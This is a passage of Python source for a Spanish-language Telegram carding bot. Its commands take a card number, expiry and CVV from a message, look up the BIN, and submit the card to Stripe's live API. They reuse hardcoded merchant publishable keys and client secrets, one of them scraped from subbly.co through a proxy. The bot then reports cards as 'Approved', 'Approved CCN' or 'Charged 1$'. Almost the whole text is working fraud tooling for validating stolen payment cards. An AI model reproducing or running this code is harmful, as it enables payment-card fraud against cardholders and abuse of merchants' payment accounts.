    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']
    flag=country1['flag']

    final = time.perf_counter()

    # REQUESTS INIT
            
    ttp_proxy  = "https://45.125.222.125:47239"

    proxies = { 
              "sock4"  : ttp_proxy,  
            }
#-----------------------------------------------------------------------------------------------
    session = requests.Session()
    req_1 = session.get('https://www.subbly.co/admin/auth/register', proxies=proxies).text
            #print(req_1)
    if 'Not allowed' in req_1:
        await message.reply(f"<b><code>xd</code> Problemas de VPN estas unsando un vpn fuera de la estencion que usas como dominio.</b>")
    seti_secret = req_1.split("window.intent = '")[1].split("'")[0]
    seti = seti_secret.split("_secret_")[0]
            
       
    headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
        }

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=juan+moltares&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&payment_method_data[muid]=66b0b062-ff6d-42f7-ae71-323cf9970d69e5c9e1&payment_method_data[sid]=a54abcfe-4809-4f9d-8f30-2b8c2280040181c17e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666&payment_method_data[time_on_page]=115132&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_rSL4eUmipHMkptbjal1vLN0F&client_secret={seti_secret}'
# REQUESTS INIT
            

    response = session.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', headers=headers, data=data)
    r = response.text
    print(r)
    if "succeeded" in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Charged 1$</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "Your card's security code is incorrect." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Approved CCN</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card's expiration year is invalid." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's expiration year is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "Your card does not support this type of purchase." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜:<code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card does not support this type of purchase.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card's security code is invalid." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's security code is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card number is incorrect." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card number is incorrect.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card was declined." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card has insufficient funds." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card has insufficient funds.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")    

    elif "requires_payment_method" in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>requires_payment_method</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "requires_action" in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>3d, Try Again ❌</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    else:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Unkmow Error</b> ❌

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    #fffffffff

    
    
    





@iniciar.message_handler(commands=['ym'], commands_prefix=comand)  
async def chk(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    with open('admins.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')

        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;

    ini = time.perf_counter()

    if message.reply_to_message: 
        ccs = message.reply_to_message.text

    else:
        ccs = message.text[len('/ym '):]
    
    if not ccs:
        await contra.edit_text("🟢[🝂] /ym: <b>Stripe Auth 3</b> | <b>Status: On ✅</b>")
        return str
        
    
    x = re.findall(r'\d+', ccs)
    cc = x[0]
    mes = x[1]                               
    ano = x[2]                               
    cvv = x[3]                               
    if mes.startswith('2'):
        mes, ano = ano, mes                                                           
    if len(mes) >= 3:
        mes, ano, cvv = ano, cvv, mes
    
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    time.sleep(1)



    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']
    flag=country1['flag']

    final = time.perf_counter()

    session = requests.session()

    h1 = {
    'authority': 'api.stripe.com',
    'method': 'POST',
    'path': '/v1/payment_intents/pi_3Mrw3IF0cG3vxqBp1r6UkzGy/confirm',
    'scheme': 'https',
    'accept': 'application/json',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'es-ES,es;q=0.9',
    'content-length': '890',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
#sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': 'Windows',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
    }

    p1 = f"setup_future_usage=off_session&payment_method_data[type]=card&payment_method_data[billing_details][name]=mm+bnbj&payment_method_data[billing_details][address][postal_code]=10071&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]=03&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=e97f7c39-c716-4d6f-9bcf-567d84a828419950f7&payment_method_data[muid]=9f9e75e5-37b8-4da3-935f-450c39437a4498e73d&payment_method_data[sid]=cfd195ba-53ab-430a-b602-29d38f9a9e6454c909&payment_method_data[payment_user_agent]=stripe.js%2Fef908cc9a8%3B+stripe-js-v3%2Fef908cc9a8&payment_method_data[time_on_page]=128130&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_H1cZ6gPpm3dKmeno9h0SdkQ6&client_secret=pi_3Mrw3IF0cG3vxqBp1r6UkzGy_secret_FLBbSr6w0mXE9fPidVZrnpf3F"
    

    api1 = session.post("https://api.stripe.com/v1/payment_intents/pi_3Mrw3IF0cG3vxqBp1r6UkzGy/confirm", data=p1, headers=h1)
    if "invalid_expiry_year" in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's expiration year is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
        
        
    elif "invalid_cvc" in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's security code is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")




    elif "incorrect_cvc" in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved CCN</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's security code is incorrect.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card number is incorrect." in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card number is incorrect.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card has insufficient funds." in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card has insufficient funds.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Invalid account." in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Invalid account.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card was declined." in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "requires_action" in api1.text:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>3d, Try Again</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    else:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 3
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Error, intente con otra tarjeta nuevamente.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")



@iniciar.message_handler(commands=['ch'], commands_prefix=comand)
async def helpstr(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Espere 🔴</b>")
    ini = time.perf_counter()
    
    if message.reply_to_message: 
        ccs = message.reply_to_message.text

    else:
        ccs = message.text[len('/ch '):]
    
    if not ccs:
        await contra.edit_text("🟣[🝂] /ch: <b>Charged Choice | Status: On</b> ✅")
        return str
        
    
    x = re.findall(r'\d+', ccs)
    cc = x[0]
    mes = x[1]                               
    ano = x[2]                               
    cvv = x[3]                               
    if mes.startswith('2'):
        mes, ano = ano, mes                                                           
    if len(mes) >= 3:
        mes, ano, cvv = ano, cvv, mes
    
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    time.sleep(1)

    
    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']
    flag=country1['flag']
    final = time.perf_counter()
   
    session = requests.session()
    s = session.post('https://m.stripe.com/6')
    r = s.json()
    guid = r['guid']
    muid = r['muid']
